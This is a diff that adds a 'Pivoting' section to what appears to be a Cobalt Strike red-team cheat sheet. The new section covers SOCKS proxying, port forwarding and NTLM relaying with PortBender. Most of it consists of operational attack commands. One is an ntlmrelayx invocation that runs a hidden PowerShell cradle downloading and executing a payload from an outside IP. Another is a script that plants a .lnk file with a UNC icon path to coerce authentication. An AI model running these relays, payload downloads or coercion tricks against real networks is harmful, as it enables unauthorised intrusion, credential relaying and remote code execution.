@@ -281,5 +281,113 @@ set SHELLCODE /tmp/beacon.bin
 run
 ```
 
+## Pivoting
+### Socksproxy
+#### Enable Socksproxy
+- OPSEC: This binds 1080 on all interfaces and since there is no authentication available on SOCKS4, this port can technically be used by anyone
+```
+socks <PORT>
+```
 
+#### Proxychains
+- For linux
+```
+sudo vim /etc/proxychains.conf
+proxychains <COMMAND>
+```
 
+#### Proxifier
+- https://www.proxifier.com/
+- For windows
+- Open Proxifier, go to Profile > Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.
+- Next, go to Profile > Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for adexplorer64.exe (part of the Sysinternals Suite).
+
+#### Metasploit
+- In Cobalt Strike, go to View > Proxy Pivots, highlight the existing SOCKS proxy and click the Tunnel button. 
+- Paste string in msfconsole
+- Stop with ```socks stop```
+
+### Manual port forwards
+#### Remote port forward netsh
+- Requires administrator privs
+```
+netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
+```
+
+#### List forwards netsh
+```
+netsh interface portproxy show v4tov4
+```
+
+#### Remove port forward netsh
+```
+netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
+```
+
+#### Create port forward
+- Beacon's reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destination, so shouldn't be used to relay traffic between individual machines.
+- Does not require administrator privs
+```
+rportfwd <PORT> <IP> <PORT>
+```
+
+#### Stop port forward
+```
+rportfwd stop <PORT>
+```
+
+#### Create port forward local
+- Beacon also has a rportfwd_local command.  Whereas rportfwd will tunnel traffic to the Team Server, rportfwd_local will tunnel the traffic to the machine running the Cobalt Strike client.
+- Does not require administrator privs
+```
+rportfwd_local <PORT> <IP> <PORT>
+```
+
+### NTLMRelaying with cobalt strike
+- https://github.com/praetorian-inc/PortBender
+- Requires administrator privs
+
+#### Place portbender driver on the target
+```
+cd C:\Windows\system32\drivers
+upload C:\Tools\PortBender\WinDivert64.sys
+```
+
+#### Load portbender.cna
+- Load PortBender.cna from C:\Tools\PortBender this adds a new PortBender command to the console.
+```
+help PortBender
+PortBender redirect 445 8445
+```
+
+#### Create port forward
+- Create a reverse port forward that will then relay the traffic from port 8445 to port 445 on the Team Server (where ntlmrelayx will be waiting).
+```
+rportfwd 8445 127.0.0.1 445
+```
+
+#### Create sockx proxy
+```
+socks 1080
+```
+
+#### NTLMRelay execute command
+```
+proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c
+'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
+```
+
+#### Stop portbender
+```
+jobs
+jobkill <JID>
+kill <PID>
+```
+
+#### Create link file
+```
+$wsh = new-object -ComObject wscript.shell
+$shortcut = $wsh.CreateShortcut("\\<IP>\test.lnk")
+$shortcut.IconLocation = "\\<IP>\test.ico"
+$shortcut.Save()
+```
